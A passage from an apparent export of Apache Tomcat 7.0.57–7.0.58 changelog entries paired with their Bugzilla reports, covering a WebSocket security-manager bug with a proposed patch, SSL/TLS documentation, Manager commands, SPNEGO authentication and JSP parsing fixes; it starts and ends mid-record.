 1) Add the following at the end of $CATALINA_BASE/conf/catalina.policy:

    grant {
      permission java.security.AllPermission;
    };

 2) Put the attached JSP file (repeat.jsp) into $CATALINA_BASE/webapps/examples/jsp
    (The repeat opens a websocket client to the echo websocket example server, 
    sends a text message and then waits for and outputs the echoed response.)

 3) Launch Tomcat from $CATALINA_BASE/bin with ""catalina run -security""

 4) Open http://127.0.0.1:8080/examples/jsp/repeat.jsp in a web browser

Expected results:

 Output ""Response from echo: Hello World!"" in the browser.

Actual results:

 An exception is printed to the console, and no output in the browser (until timeout).

 Exception in thread ""anInnocuousThread"" java.security.AccessControlException: access denied (""java.lang.RuntimePermission"" ""accessClassInPackage.org.apache.tomcat.websocket"")
        at java.security.AccessControlContext.checkPermission(AccessControlContext.java:457)
        at java.security.AccessController.checkPermission(AccessController.java:884)
        at java.lang.SecurityManager.checkPermission(SecurityManager.java:549)
        at java.lang.SecurityManager.checkPackageAccess(SecurityManager.java:1564)
        at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:305)
        at java.lang.ClassLoader.loadClass(ClassLoader.java:411)
        at java.lang.ClassLoader.loadClass(ClassLoader.java:357)
        at org.apache.tomcat.websocket.AsyncChannelGroupUtil$AsyncIOThreadFactory.newThread(AsyncChannelGroupUtil.java:116)
        at java.util.concurrent.ThreadPoolExecutor$Worker.<init>(ThreadPoolExecutor.java:612)
        at java.util.concurrent.ThreadPoolExecutor.addWorker(ThreadPoolExecutor.java:925)
        at java.util.concurrent.ThreadPoolExecutor.execute(ThreadPoolExecutor.java:1368)
        at org.apache.tomcat.util.threads.ThreadPoolExecutor.execute(ThreadPoolExecutor.java:161)
        at org.apache.tomcat.util.threads.ThreadPoolExecutor.execute(ThreadPoolExecutor.java:141)
        at sun.nio.ch.AsynchronousChannelGroupImpl.executeOnPooledThread(AsynchronousChannelGroupImpl.java:188)
        at sun.nio.ch.Invoker.invokeIndirectly(Invoker.java:212)
        at sun.nio.ch.Invoker.invoke(Invoker.java:188)
        at sun.nio.ch.Invoker.invoke(Invoker.java:297)
        at sun.nio.ch.WindowsAsynchronousSocketChannelImpl$WriteTask.completed(WindowsAsynchronousSocketChannelImpl.java:839)
        at sun.nio.ch.Iocp$EventHandlerTask.run(Iocp.java:397)
        at java.lang.Thread.run(Thread.java:745)
        at sun.misc.InnocuousThread.run(InnocuousThread.java:74)
 Exception in thread ""anInnocuousThread"" java.security.AccessControlException: access denied (""java.lang.RuntimePermission"" ""accessClassInPackage.org.apache.tomcat.websocket"")
        at java.security.AccessControlContext.checkPermission(AccessControlContext.java:457)
        at java.security.AccessController.checkPermission(AccessController.java:884)
        at java.lang.SecurityManager.checkPermission(SecurityManager.java:549)
        at java.lang.SecurityManager.checkPackageAccess(SecurityManager.java:1564)
        at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:305)
        at java.lang.ClassLoader.loadClass(ClassLoader.java:411)
        at java.lang.ClassLoader.loadClass(ClassLoader.java:357)
        at org.apache.tomcat.websocket.AsyncChannelGroupUtil$AsyncIOThreadFactory.newThread(AsyncChannelGroupUtil.java:116)
        at java.util.concurrent.ThreadPoolExecutor$Worker.<init>(ThreadPoolExecutor.java:612)
        at java.util.concurrent.ThreadPoolExecutor.addWorker(ThreadPoolExecutor.java:925)
        at java.util.concurrent.ThreadPoolExecutor.execute(ThreadPoolExecutor.java:1368)
        at org.apache.tomcat.util.threads.ThreadPoolExecutor.execute(ThreadPoolExecutor.java:161)
        at org.apache.tomcat.util.threads.ThreadPoolExecutor.execute(ThreadPoolExecutor.java:141)
        at sun.nio.ch.AsynchronousChannelGroupImpl.executeOnPooledThread(AsynchronousChannelGroupImpl.java:188)
        at sun.nio.ch.Invoker.invokeIndirectly(Invoker.java:212)
        at sun.nio.ch.Invoker.invoke(Invoker.java:188)
        at sun.nio.ch.Invoker.invoke(Invoker.java:297)
        at sun.nio.ch.WindowsAsynchronousSocketChannelImpl$ReadTask.completed(WindowsAsynchronousSocketChannelImpl.java:581)
        at sun.nio.ch.Iocp$EventHandlerTask.run(Iocp.java:397)
        at java.lang.Thread.run(Thread.java:745)
        at sun.misc.InnocuousThread.run(InnocuousThread.java:74)

 (The repeat is of course artificial. In reality the websocket client is used outside of the servlet page rendering, but the same exception occurs.)

The fix for bug 57091 tried to overcome the limitations of the InnocuousThread that serves the completion handler, by wrapping the implementation of AsyncChannelGroupUtil.AsyncIOThreadFactory.newThread in a privileged block. However, due to the null protection domain of InnocuousThread, the method is in this case not even allowed to load its own anonymous PrivilegedAction class!

The anonymous class is called ""org.apache.tomcat.websocket.AsyncChannelGroupUtil$AsyncIOThreadFactory$1"", which triggers the check for the ""accessClassInPackage.org.apache.tomcat.websocket"" runtime permission. Normally this permission is granted to all code by catalina.policy, but the InnocuousThread has no permissions regardless of policy.

A dirty workaround is to uncomment this line at the top of the JSP code:

  Class.forName(""org.apache.tomcat.websocket.AsyncChannelGroupUtil$AsyncIOThreadFactory$1"");

Then the anonymous class is loaded by the application class loader at a time when there are permissions to do so (i.e. outside of the InnocuousThread), and the repeat will then work without exception (even after commenting out this line again, as long as Tomcat isn't restarted).

Running Tomcat without ""-security"" also makes the repeat work without exception.

There is an open OpenJDK issue about the InnocuousThread being used for the completion handler (https://bugs.openjdk.java.net/browse/JDK-8051403), but it would be good if this could be fixed in Tomcat until (or if not) the JDK is fixed.

One fix is to use a non-anonymous PrivilegedAction in AsyncChannelGroupUtil.AsyncIOThreadFactory.newThread and then force it to be loaded when AsyncChannelGroupUtil.AsyncIOThreadFactory is initialized, by accessing the class in a static initializer:

--- AsyncChannelGroupUtil.java.old      2015-01-09 16:04:42.000000000 +0100
+++ AsyncChannelGroupUtil.java  2015-01-24 01:30:33.660184500 +0100
@@ -113,16 +113,32 @@
             // the thread inherits the current ProtectionDomain which is
             // essential to be able to use this with a Java Applet. See
             // https://issues.apache.org/bugzilla/show_bug.cgi?id=57091
-            return AccessController.doPrivileged(new PrivilegedAction<Thread>() {
-                @Override
-                public Thread run() {
-                    Thread t = new Thread(r);
-                    t.setName(""WebSocketClient-AsyncIO-"" + count.incrementAndGet());
-                    t.setContextClassLoader(this.getClass().getClassLoader());
-                    t.setDaemon(true);
-                    return t;
-                }
-            });
+            return AccessController.doPrivileged(new NewThreadPrivilegedAction(r));
         }
+
+        // Non-anonymous class due to class loading hack below
+        private class NewThreadPrivilegedAction implements PrivilegedAction<Thread> {
+
+            private final Runnable r;
+
+            public NewThreadPrivilegedAction(Runnable r) {
+                this.r = r;
+            }
+
+            @Override
+            public Thread run() {
+                Thread t = new Thread(r);
+                t.setName(""WebSocketClient-AsyncIO-"" + count.incrementAndGet());
+                t.setContextClassLoader(this.getClass().getClassLoader());
+                t.setDaemon(true);
+                return t;
+            }
+        }
+
+        // Load the privileged action class on initialization, since newThread is
+        // not be allowed to load it when called from an InnocuousThread, see
+        // https://issues.apache.org/bugzilla/show_bug.cgi?id=XXXXX
+        @SuppressWarnings(""unused"")
+        private static final Class newThreadPrivilegedActionClass = NewThreadPrivilegedAction.class;
     }
 }

When I applied this patch to Tomcat 8.0.17, the repeat worked without any exception.

Maybe there is another cleaner fix. Either way, it would be good if the fix could be applied to 7.0.x as well, since the bug is also repeatable there (I tried in 7.0.57)."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57490
WebSocket|Tomcat 7.0.58 (violetagg)|add||Add some debug logging to the WebSocket session to track session creation and session closure. (markt)|||
Web applications|Tomcat 7.0.58 (violetagg)|fix||Update documentation for CGI servlet. Recommend to copy the servlet declaration into web application instead of enabling it globally. Correct documentation for cgiPathPrefix. (kkolinko)|||
Web applications|Tomcat 7.0.58 (violetagg)|update||Improve HTML version of build instructions and align with BUILDING.txt. Document creating second Eclipse project to compile WebSocket classes with Java 7 (ide-eclipse-websocket target added in 7.0.56). (kkolinko)|||
Web applications|Tomcat 7.0.58 (violetagg)|update||Improve Tomcat Manager documentation. Rearrange, add section on HTML GUI, document /expire command and Server Status page. (kkolinko)|||
Web applications|Tomcat 7.0.58 (violetagg)|fix||Fix ambiguity of section links on Valves configuration reference page. (kkolinko)|||
Web applications|Tomcat 7.0.58 (violetagg)|update|57238|Update information on SSL/TLS on Security and SSL documentation pages. Based on patch by Glen Peterson. (kkolinko)|Updated SSL/TLS information for Tomcat 8/9|"Created attachment 32218 [details]
A documentation diff made using git-svn diff.

ssl-howto.html: Added TLS to the title and updated to say SSL/TLS in a few places and to acknowledge that SSL is obsolete since the POODLE attack this year, and that Transport Layer Security (TLS) has replaced it.  Didn't go crazy because all the Tomcat settings are still called sslWhatever.  Linked to the security-howto.html document.

security-howto.html: Added that the ciphers attribute supports OpenSSL syntax, plus an example attribute-value that works well today.  Also added a paragraph on sslEnabledProtocols since this is the only way I know to make standalone Tomcat POODLE-proof.

I may have made these changes to the Tomcat 9 docs by accident, but they apply equally well to 8 or 9 AFAIK, so maybe someone could merge them appropriately?

Christopher Schultz suggested on the Tomcat Users list 2011-11-13 that I try submitting a documentation patch here as an attachment.  This is my first Tomcat Documentation Patch ever."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57238
Web applications|Tomcat 7.0.58 (violetagg)|add|57261|Add vminfo and threaddump commands to Manager application. Implement VminfoTask and ThreaddumpTask Ant tasks. (kkolinko)|Align /vminfo and /threaddump with other Manager commands and document them|"ManagerServlet supports the following commands that are not yet documented:

http://localhost:8080/manager/text/vminfo
http://localhost:8080/manager/text/threaddump

For reference see r1476960 (in 8.0.0) and r1578256 (in 8.0.4).

TODO:
1. It is documented that all Manager commands have output that starts with ""OK"".
These commands do not have an ""OK"" line, but start their output with a date. It is wrong and has to be fixed.

This includes the need to fix VminfoTask and ThreaddumpTask Ant tasks (r1578256).

2. Document them in manager-howto.html

3. Maybe mention them in Javadoc for ManagerServlet class, like other commands are listed there."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57261
Web applications|Tomcat 7.0.58 (violetagg)|fix|57323|Correct display of outdated sessions in sessions count listing in Manager application. (kkolinko)|Correct display of outdated sessions in sessions count listing in Manager application|"A minor issue, reported in Re:r1614165,
http://markmail.org/message/4iplahbcanujbqoo

The Manager application has commands that display distribution of sessions according to their idle time. (The commands are ""/text/sessions"", ""/text/expire"" in Test GUI and ""Expire Sessions"" button in HTML GUI.)

The commands display how many sessions have idle time <1 minute, from 1 up to 2 minutes (1 - <2), from 2 to 3 (2 - <3) and so on.

Lets assume that a web application is configured with session-timeout of 30 minutes. Before r1614165 (in 7.0.56)/r1614163 (in 8.0.11) the last time slot in that statistics was labeled "">= 30"". In those revisions it was fixed to be labeled ""29 - <30"".

Actually it should have been labeled "">= 29"", as sessions that have idle time more than 30 minutes are actually added to the value,

 else if (time >= maxCount)
 timeout[maxCount-1]++; 

It would be better to count outdated sessions in a separate time slot, so that  ""29 - <30"" and "">=30"" were two distinct numbers.

One may see "">=30"" sessions if the thread that performs expiration have not run yet (or is stuck).


An incorrect configuration to test this behaviour:
1. Configure examples application with the following text in its web.xml

 <session-config>
  <session-timeout>2</session-timeout>
 </session-config> 
and the following META-INF/context.xml
 <Context backgroundProcessorDelay=""10""/>

2. Configure a user with roles manager-script and manager-gui. Start Tomcat.

3. Visit example webapp -> Servlet examples -> Session example to create a session.

4. Visit http://localhost:8080/manager/html, click on sessions number on the row for the examples webapp. A list of sessions opens. Use it to check idle time of the session.

5. Visit http://localhost:8080/manager/text/sessions?path=/examples to see sessions statistics.

6. Wait for 2 minutes.
Expected output of /text/sessions command is that you have a session that is idle for more than 2 minutes.

Actual output is ""1 - <2 minutes: 1 sessions"""|https://bz.apache.org/bugzilla/show_bug.cgi?id=57323
Web applications|Tomcat 7.0.58 (violetagg)|add||Add document of ClusterSingleSignOn. (kfujino)|||
Web applications|Tomcat 7.0.58 (violetagg)|update||Clarify documentation for useBodyEncodingForURI attribute of a connector. (kkolinko)|||
Other|Tomcat 7.0.58 (violetagg)|update||When downloading required libraries at build time, use random name for temporary file and automatically create destination directory (base.path). (kkolinko)|||
Other|Tomcat 7.0.58 (violetagg)|update||Update optional Checkstyle library to 6.1.1. (kkolinko)|||
Other|Tomcat 7.0.58 (violetagg)|update||Simplify setproxy task in build.xml. Taskdef there is not needed since Ant 1.8.2. (kkolinko)|||
Other|Tomcat 7.0.58 (violetagg)|fix||Improve Java 7 support in build.xml. Check whether the specified ${java.7.home} is valid. By default use Java that runs Ant (${java.home}) instead of the one found on $PATH to run JUnit tests. (kkolinko)|||
Other|Tomcat 7.0.58 (violetagg)|add|57344|Provide sha1 checksum files for Tomcat downloads. Correct filename patterns for apache-tomcat-*-embed.tar.gz archive to exclude an *.asc file. (kkolinko)|[PATCH] Provide sha1 checksum files for Tomcat downloads|"I prepared a patch that adds *.sha1 files to Tomcat release besides the *.md5 ones.

Are there any objections?

Minor issue fixed by the way:
due to missing <exclude name=""*.asc""> the apache-tomcat-8.0.15-embed.tar.gz archive contains apache-tomcat-8.0.15-embed.zip.asc file that does not belong there.


Is it worth to add sha2 (sha-512)? I have some questions:

My issues with sha-512:
=========================
1) Is it worth adding sha-512?
Generally users shall use PGP signatures for verification, not the checksums.

2) Not many ASF projects are providing sha2 checksums.
One that I know is Apache Ant,

http://ant.apache.org/bindownload.cgi

Looking at Apache Ant, I have several notes:

a) *.sha512 files are not copied to mirrors, so ASF mirror system knows how to skip these files. (Good)

b) when I click on the link to a file, browser (Firefox 34) does not display the file, but prompts to download it. (Unexpected)

Looking at response headers in Firefox, the server sends Content-Type: application/zip for *.zip.sha512, application/x-gzip for *.tar.gz.sha512, application/x-bzip2 for *.tar.bz2.

So the server is not configured for these files. It sends text/plain for *.sha1 files.


3) I do not have a command-line tool to automatically verify sha-512.

There exist sha512sum from GNU,
http://www.gnu.org/software/coreutils/manual/coreutils.html#sha2-utilities

but GnuWin32 CoreUtils do not have this tool.


4) What file format shall we use?

Apache Ant downloads are using  hashsum + LF.

We are using  hashsum + "" *"" + filename, which is the format supported by md5sum and sha1sum GNU utilities.

`openssl dgst -sha512 filename` generates ""SHA512("" + filename + "")= "" +hashsum +LF, but I think that openssl does not read this format.

I think it would better to print just the hashsum value, but I wonder if that is supported by sha512sum tool."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57344
Catalina|Tomcat 7.0.57 (violetagg)|add|47919|Extend the information logged when Tomcat starts to optionally log the values of command line arguments (enabled by default) and environment variables (disabled by default). Note that the values added to CATALINA_OPTS and JAVA_OPTS environment variables will be logged, as they are used to build up the command line. (markt)|Log Tomcat & Java environment variables in addition to echoing to the screen|"When looking at a catalina.out, it's not always clear what the environment variables resolved to at the time the process was started.

This information may be echoed to the screen if not started by hand, but that may be gone by the time we're looking at the log file.

It would be helpful to log these variables to the catalina.out at startup."|https://bz.apache.org/bugzilla/show_bug.cgi?id=47919
Catalina|Tomcat 7.0.57 (violetagg)|add|56401|Log version information when Tomcat starts. (markt/kkolinko)|Log version information on startup|"Create a new ""startup"" logger and emit some good information to it such as version, etc."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56401
Catalina|Tomcat 7.0.57 (violetagg)|fix|57022|Ensure SPNEGO authentication continues to work with the JNDI Realm using delegated credentials with recent Oracle JREs. (markt)|Tomcat Spnego authentication against Active Directory fails with Java 8|"Created attachment 32059 [details]
Tomcat JAAS configuration

Hello everyone,
   I'm successfully using Tomcat 7.0.55 configured with Spnego authentication against Active Directory running Windows 2008 Server and Java 1.7.0.51. 
After switching to Java 1.8.0_20, authentication does not work anymore, Tomcat logs the following error message:

SEVERE: Exception performing authentication
javax.naming.AuthenticationException: GSSAPI [Root exception is javax.security.sasl.SaslException: GSS initiate failed [Caused by GSSException: No valid credentials provided (
Mechanism level: Failed to find any Kerberos tgt)]]; remaining name 'CN=Users,DC=example,DC=com'
        at com.sun.jndi.ldap.sasl.LdapSasl.saslBind(LdapSasl.java:169)
        at com.sun.jndi.ldap.LdapClient.authenticate(LdapClient.java:236)
        at com.sun.jndi.ldap.LdapCtx.connect(LdapCtx.java:2788)
        at com.sun.jndi.ldap.LdapCtx.ensureOpen(LdapCtx.java:2696)
        at com.sun.jndi.ldap.LdapCtx.ensureOpen(LdapCtx.java:2670)
        at com.sun.jndi.ldap.LdapCtx.doSearch(LdapCtx.java:1941)
        at com.sun.jndi.ldap.LdapCtx.searchAux(LdapCtx.java:1844)
        at com.sun.jndi.ldap.LdapCtx.c_search(LdapCtx.java:1769)
        at com.sun.jndi.toolkit.ctx.ComponentDirContext.p_search(ComponentDirContext.java:392)
        at com.sun.jndi.toolkit.ctx.PartialCompositeDirContext.search(PartialCompositeDirContext.java:358)
        at com.sun.jndi.toolkit.ctx.PartialCompositeDirContext.search(PartialCompositeDirContext.java:341)
        at javax.naming.directory.InitialDirContext.search(InitialDirContext.java:267)
        at org.apache.catalina.realm.JNDIRealm.getUserBySearch(JNDIRealm.java:1446)
        at org.apache.catalina.realm.JNDIRealm.getUser(JNDIRealm.java:1297)
        at org.apache.catalina.realm.JNDIRealm.getUser(JNDIRealm.java:1233)
        at org.apache.catalina.realm.JNDIRealm.getPrincipal(JNDIRealm.java:2049)
        at org.apache.catalina.realm.JNDIRealm.getPrincipal(JNDIRealm.java:1965)
        at org.apache.catalina.realm.RealmBase.authenticate(RealmBase.java:513)
        at org.apache.catalina.realm.CombinedRealm.authenticate(CombinedRealm.java:309)
        at org.apache.catalina.realm.LockOutRealm.authenticate(LockOutRealm.java:249)
        at org.apache.catalina.authenticator.SpnegoAuthenticator.authenticate(SpnegoAuthenticator.java:255)
 
Tomcat is configured according to the ""Windows Authentication How-To"" document, I'm attaching the krb5.ini, jaas.conf and server.xml that contains the JNDIRealm definition.

I have investigated the problem and I believe it is related to the Kerberos constraint delegation support added in Java 8, see:

http://docs.oracle.com/javase/8/docs/technotes/guides/security/jgss/jgss-features.html
http://bugs.java.com/bugdatabase/view_bug.do?bug_id=6355584

It seems that per default, GSS API in Java 8 will attempt constraint delegation on the acceptor side, see referenced changes and in particular the getCredDelegState() method:
http://hg.openjdk.java.net/jdk8/jdk8/jdk/rev/a1bbb8805e22

The result of this, is that Tomcat's JNDIRealm now finds the delegated credential delivered with the constraint delegation and switches GSSAPI security mechanism for JNDI/LDAP (this was not the case on Java 7). However, the Kerberos initiation during LDAP authentication does not find the Kerberos TGT in the Subject. After digging further, I noticed that the Subject used during the LDAP authentication is not set. Though the SpnegoAuthenticator initializes a Subject instance using Kerberos login via JAAS and this contains the obtained TGT, this Subject instance is not used for performing the LDAP authentication. I saw the following comment in JNDIRealm.getPrincipal:

// Note: Subject already set in SPNEGO authenticator so no need for Subject.doAs() here

So I decided to modify this and execute the getPrincipal using Subject.doAs() and the Subject instance available after the Kerberos login. This lead to successful authentication to LDAP and I was able to access the Spnego-secured webapp again.

Please note that this setup is not using any file-system Kerberos credential cache, so it requires that the Kerberos TGT is available in the Subject instance associated with current ACC."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57022
Catalina|Tomcat 7.0.57 (violetagg)|fix||Correct a couple of NPEs in the JNDI Realm that could be triggered with when not specifying a roleBase and enabling roleSearchAsUser. (markt)|||
Catalina|Tomcat 7.0.57 (violetagg)|fix||Remove the unnecessary registration of context.xml as a redeploy resource. The context.xml having an external docBase has already been registered as a redeploy resources at first. (kfujino)|||
Catalina|Tomcat 7.0.57 (violetagg)|fix||Improve the previous fix for 56401. Avoid logging version information in the constructor since it then gets logged at undesirable times such as when using StoreConfig. (markt)|Log version information on startup|"Create a new ""startup"" logger and emit some good information to it such as version, etc."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56401
Catalina|Tomcat 7.0.57 (violetagg)|fix|57105|When parsing web.xml do not limit the buffer element of the jsp-property-group element to integer values as the allowed values are <number>kb or none. (markt)|<buffer> under <jsp-property-group>  in web.xml only accept integer which doesn't follow spec and cause jsp compile fail|"For example, I expected the following should be fine:
<jsp-property-group>
  <buffer>32kb</buffer>
</jsp-property-group>

BUT actually, it will cause start app fail.

If I change it to:
<buffer>32000</buffer>

It is accepted. BUT, jsp compile will FAIL!"|https://bz.apache.org/bugzilla/show_bug.cgi?id=57105
Catalina|Tomcat 7.0.57 (violetagg)|update||Update the minimum required version of the Tomcat Native library (if used) to 1.1.32. (markt)|||
Catalina|Tomcat 7.0.57 (violetagg)|update|57144|Improve ClientAbortException to provide non-null message. (kkolinko)|Improve ClientAbortException.getMessage() to provide non-null message in Tomcat 7|"For reference - r1634258 and r1360468

I was backporting a test for BZ 54928 from Tomcat 8 to Tomcat 7 and noted a difference in output. The code was:

 log.info(""Exception caught "" + e.getMessage());

In Tomcat 7 (7.0.56+) it resulted in
 ""Exception caught null""
while on Tomcat 8 (8.0.14+) it was
 ""Exception caught Software caused connection abort: socket write error"".

When I changed the code to use e.toString() it became:
in Tomcat 7:
 ""Exception caught ClientAbortException:  java.net.SocketException: Software caused connection abort: socket write error""
in Tomcat 8:
 ""Exception caught org.apache.catalina.connector.ClientAbortException: java.net.SocketException: Software caused connection abort: socket write error""


The difference comes from r1360468. Essentially Tomcat 8 delegates processing to original implementations in java.lang.Throwable, while the old code in Tomcat 7 has its own implementation of getMessage() and toString().

There are two differences:

a) The Throwable(Throwable cause) constructor in Java initializes message as cause.toString() while in ClientAbortException(Throwable) the message defaults to being null.

b) Throwable.toString() uses the fully qualified name of a class, while ClientAbortException.toString() prints just ""ClientAbortException""."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57144
Catalina|Tomcat 7.0.57 (violetagg)|fix||AsyncContext should remain usable until fireOnComplete is called. (remm)|||
Catalina|Tomcat 7.0.57 (violetagg)|fix||AsyncContext createListener should wrap any instantiation exception using a ServletException. (remm)|||
Coyote|Tomcat 7.0.57 (violetagg)|add|53952|Add support for TLSv1.1 and TLSv1.2 for APR connector. Based upon a patch by Marcel ≈†ebek. This feature requires Tomcat Native library 1.1.32 or later. (schultz/jfclere)|Add support for TLS 1.1 and 1.2|"Created attachment 29433 [details]
patch for tomcat trunk that adds support for newer TLS versions

It would be nice to have support for newer versions of TLS protocol. Due to BEAST attack, the only usable ciphersuites supported by TLS version 1.0 are those based on RC4.

I'll attach compile-tested patches for both tcnative and tomcat."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53952
Coyote|Tomcat 7.0.57 (violetagg)|add||Disable SSLv3 by default for JSSE based HTTPS connectors (BIO and NIO). The change also ensures that SSLv2 is disabled for these connectors although SSLv2 should already be disabled by default by the JRE. (markt)|||
Coyote|Tomcat 7.0.57 (violetagg)|add||Disable SSLv3 by default for the APR/native HTTPS connector. (markt)|||
Coyote|Tomcat 7.0.57 (violetagg)|fix||Do not increase remaining counter at end of stream in IdentityInputFilter. (kkolinko)|||
Coyote|Tomcat 7.0.57 (violetagg)|fix||Async state MUST_COMPLETE should still be started. (remm)|||
Jasper|Tomcat 7.0.57 (violetagg)|fix|57099|Ensure that semi-colons are not permitted in JSP import page directives. (markt)|loose parsing of import attribute in page directive screws up SMAP output|"Came across some customer code that had the following in their jsp files:

<%@
 page session=""false""
 buffer=""8kb""
 import=""java.io.*;
         import java.util.*;
         import java.text.*;
         import java.util.Date.*;
         import java.text.DecimalFormat;
         import com.xyz.debug.Debug;
         import com.xyz.failure.*;
         import com.xyz.messaging.*;
         import com.xyz.utils.*;
         import com.xyz.xml_messaging.*;
         import com.xyz.environment.*;
         import generated.screening_engine.*;
         import generated.xml_utils.*;""
 contentType=""text/html""
%>

Even though the JSP spec says that the import statement should be ""The value is as in an import declaration in the Java programming language, a (comma separated) list of either a fully qualified Java programming language type name denoting that type, or of a package name followed by the .* string, denoting all the public types declared in that package."" this is parsed/compiled by the JSP parser."" these folks seem to have stumbled on to a, well, different way of specifying a list of imports.

Since the JSP parser only sees a ""single"" import and believes it has merely written a single import line, the SMAP numbering ends up being off by, in this case, 12, causing all sorts of fun down the line when trying to map back to original jsp code by way of the SMAP file.

In short, it appears that one could, in an import statement, append a semicolon and then put whatever java code they want, and it would go in and get compiled in as long as there weren't any commas in it."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57099
Cluster|Tomcat 7.0.57 (violetagg)|fix||Avoid possible integer overflows reported by Coverity Scan. (fschumacher)|||
WebSocket|Tomcat 7.0.57 (violetagg)|fix|57054|Correctly handle the case in the WebSocket client when the HTTP response to the upgrade request can not be read in a single pass; either because the buffer is too small or the server sent the response in multiple packets. (markt)|ReadBufferOverflowException when headers come via two requests|"Using the Cloud Foundry Java Client Libraries (https://github.com/cloudfoundry/cf-java-client), a WebSocket stream is used to stream logs from apps that are starting in Cloud Foundry.  The initial request is an HTTPS request that then should return an HTTP 101 to switch protocols to WebSockets.  If the headers for this response come in one read of the API, then the Tomcat WebSockets implementation has no issue, as in:

HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: hkNdVhwFUAVd2BNAbrwraD5lyx4=
<\r\n>

However, if it takes a second read to get all the headers, Tomcat's WebSockets do not empty the buffer, causing a ReadBufferOverflowException, as in:

HTTP/1.1 101 Switching Protocols
Sec-WebSocket-Accept: XtszcLxcZ+4QUaIvrLf7oi+r04M=
Date: Fri, 03 Oct 2014 01:19:45 GMT
X-Global-Transaction-ID: 217338896
Upgrade: websocket

And then another read:

Connection: Upgrade
<\r\n>

The stack trace for this problem is:

!ENTRY org.cloudfoundry.ide.eclipse.server.core 4 0 2014-06-12 11:52:13.251
!MESSAGE Failed to add application log listener for eyTestWeb3 - Error performing Cloud Foundry operation: javax.websocket.DeploymentException: The HTTP request to initiate the WebSocket connection failed
!STACK 1
org.eclipse.core.runtime.CoreException: Error performing Cloud Foundry operation: javax.websocket.DeploymentException: The HTTP request to initiate the WebSocket connection failed
at org.cloudfoundry.ide.eclipse.server.core.internal.CloudErrorUtil.toCoreException(CloudErrorUtil.java:208)
at org.cloudfoundry.ide.eclipse.server.core.internal.client.BaseClientRequest.runAndWait(BaseClientRequest.java:154)
at org.cloudfoundry.ide.eclipse.server.core.internal.client.ClientRequest.runAndWait(ClientRequest.java:66)
at org.cloudfoundry.ide.eclipse.server.core.internal.client.LocalServerRequest.runAndWait(LocalServerRequest.java:64)
at org.cloudfoundry.ide.eclipse.server.core.internal.client.BaseClientRequest.run(BaseClientRequest.java:70)
at org.cloudfoundry.ide.eclipse.server.core.internal.client.CloudFoundryServerBehaviour.addApplicationLogListener(CloudFoundryServerBehaviour.java:782)
at org.cloudfoundry.ide.eclipse.server.ui.internal.console.ApplicationLogConsoleStream.initialiseStream(ApplicationLogConsoleStream.java:82)
at org.cloudfoundry.ide.eclipse.server.ui.internal.console.CloudFoundryConsole.getStream(CloudFoundryConsole.java:84)
at org.cloudfoundry.ide.eclipse.server.ui.internal.console.CloudFoundryConsole.startTailing(CloudFoundryConsole.java:64)
at org.cloudfoundry.ide.eclipse.server.ui.internal.console.ConsoleManager.startConsole(ConsoleManager.java:112)
at org.cloudfoundry.ide.eclipse.server.ui.internal.CloudFoundryUiCallback.startApplicationConsole(CloudFoundryUiCallback.java:79)
at org.cloudfoundry.ide.eclipse.server.core.internal.client.CloudFoundryServerBehaviour$RestartOperation.performDeployment(CloudFoundryServerBehaviour.java:2643)
at org.cloudfoundry.ide.eclipse.server.core.internal.client.CloudFoundryServerBehaviour$StartOperation.performDeployment(CloudFoundryServerBehaviour.java:2232)
at org.cloudfoundry.ide.eclipse.server.core.internal.client.CloudFoundryServerBehaviour$PushApplicationOperation.performDeployment(CloudFoundryServerBehaviour.java:2460)
at org.cloudfoundry.ide.eclipse.server.core.internal.client.CloudFoundryServerBehaviour$ApplicationOperation.performOperation(CloudFoundryServerBehaviour.java:1994)
at org.cloudfoundry.ide.eclipse.server.core.internal.client.AbstractDeploymentOperation.run(AbstractDeploymentOperation.java:42)
at org.cloudfoundry.ide.eclipse.server.core.internal.client.CloudFoundryServerBehaviour.publishModule(CloudFoundryServerBehaviour.java:1367)
at org.eclipse.wst.server.core.model.ServerBehaviourDelegate.publishModule(ServerBehaviourDelegate.java:1091)
at org.eclipse.wst.server.core.model.ServerBehaviourDelegate.publishModules(ServerBehaviourDelegate.java:1183)
at org.eclipse.wst.server.core.model.ServerBehaviourDelegate.publish(ServerBehaviourDelegate.java:987)
at org.eclipse.wst.server.core.model.ServerBehaviourDelegate.publish(ServerBehaviourDelegate.java:774)
at org.eclipse.wst.server.core.internal.Server.publishImpl(Server.java:3154)
at org.eclipse.wst.server.core.internal.Server$PublishJob.run(Server.java:345)
at org.eclipse.core.internal.jobs.Worker.run(Worker.java:53)
Caused by: org.cloudfoundry.client.lib.CloudOperationException: javax.websocket.DeploymentException: The HTTP request to initiate the WebSocket connection failed
at org.cloudfoundry.client.lib.rest.LoggregatorClient.connectToLoggregator(LoggregatorClient.java:45)
at org.cloudfoundry.client.lib.rest.CloudControllerClientImpl.streamLoggregatorLogs(CloudControllerClientImpl.java:1634)
at org.cloudfoundry.client.lib.rest.CloudControllerClientImpl.streamLogs(CloudControllerClientImpl.java:233)
at org.cloudfoundry.client.lib.CloudFoundryClient.streamLogs(CloudFoundryClient.java:336)
at org.cloudfoundry.ide.eclipse.server.core.internal.client.CloudFoundryServerBehaviour$19.doRun(CloudFoundryServerBehaviour.java:778)
at org.cloudfoundry.ide.eclipse.server.core.internal.client.CloudFoundryServerBehaviour$19.doRun(CloudFoundryServerBehaviour.java:1)
at org.cloudfoundry.ide.eclipse.server.core.internal.client.BaseClientRequest.runAndWait(BaseClientRequest.java:127)
... 22 more
Caused by: javax.websocket.DeploymentException: The HTTP request to initiate the WebSocket connection failed
at org.apache.tomcat.websocket.WsWebSocketContainer.connectToServer(WsWebSocketContainer.java:315)
at org.cloudfoundry.client.lib.rest.LoggregatorClient.connectToLoggregator(LoggregatorClient.java:42)
... 28 more
Caused by: java.util.concurrent.ExecutionException: org.apache.tomcat.websocket.ReadBufferOverflowException
